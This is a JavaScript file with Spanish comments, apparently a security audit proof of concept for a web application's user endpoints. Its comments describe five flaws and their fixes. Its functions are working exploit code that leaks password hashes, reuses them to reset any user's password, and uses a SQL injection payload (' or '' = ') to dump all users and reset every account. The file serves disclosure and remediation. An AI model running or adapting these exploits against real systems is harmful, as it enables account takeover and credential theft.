/**
 * Problema 1:
 *   - Resetea el password de cualquier usuario, como parte del
 *     proceso, pide el email, el hash del password viejo y el
 *     hash de la contraseña vieja
 *
 *  Soluciones
 *    - Deberia de cambiar la contraseña del usuario actual, no de cualquier
 *      usuario via email.
 *
 */
function reset_all_password_with_token(email, old_passwd_hash, new_passwd) {
    return $.ajax({
        url: '/ajaxUpdate?accion=actPass',
        type: 'POST',
        dataType: 'json',
        data: JSON.stringify({
            contrasenaVieja: old_passwd_hash,
            contrasenaNueva: $.md5( new_passwd ),
            contrasenaNueva1: $.md5( new_passwd ),
            correoUsuario: email,
        }),
        contentType: 'application/json',
        mimeType: 'application/json',
    });
}

/**
 * Problema 2:
 * El end-point getUsuarios returna el hash del password del usuario
 * consultado, es un problema de seguridad enorme. El mismo hash
 * del password es utilizado para cambiar la contraseña del usuario.
 *
 * Con esto se puede reiniciar la contraseña de cualquier email, sin saber
 * la real contraseña de ese email.
 */
function reset_all_password_by_email( email, new_passwd ) {
    $.get('/ajaxSelects?accion=getUsuarios&usuario=' + email, 'json' )
        .then(function(r) {
            var user = JSON.parse(r).usuarios[0];
            return reset_all_password_with_token( email, user.passwd, new_passwd );
        }).then(function(r) {
            console.error(r);
        });
}

/**
 * Problema 3:
 * getUsuarios() tiene un problema de SQL injection. Al pasarle estos parametros
 * retorna una lista de todos los usuarios del sistema, con los hashes de sus
 * password.
 *
 * Solucionar:
 *   - Escapar todos los datos externos en la SQL query
 *   - Excluir el password hash de cada usuario
 */
function reset_all_password( new_pass ) {
    $.get( "/ajaxSelects?accion=getUsuarios&usuario=' or '' = '", 'json')
        .then(function(r) {
            var usuarios = JSON.parse(r).usuarios;

            usuarios.map(function(user) {
                reset_all_password_with_token( user.correo, user.passwd, new_pass );
            });
        });
}

/**
 * Problema 4:
 * Al crear y validar usuario el hash se genera en el cliente y no en el servidor, además de ser un riesgo
 * de seguridad esto imposibilita validar la longitud de contraseñas ademas de confiar en la información
 * que llega desde el cliente
 *
 * Solucionar:
 *   - Aplicar el algoritmo de hashing en el servidor (Solucionado en nuestro API Django)
 *  Donde: /spr/src/main/webapp/usuarios.jsp lineas: 485, 1380
 *         /spr/src/main/webapp/frames/pass.jsp lineas: 36, 37, 38
 */

 /**
 * Problema 5:
 * Se utiliza un algoritmo de hashing(MD5) totalmente obsoleto e inseguro, facilmente reversible
 * en varios servicios online o en tablas de hash, solo falta 'googlear' el hash(que devuelve el API)
 *
 * Solucion:
 *   - Usar un algoritmo de hashing como BCrypt o SHA356 con Salteo e
 *     iteraciones(Solucionado en nuestro API Django)
 */


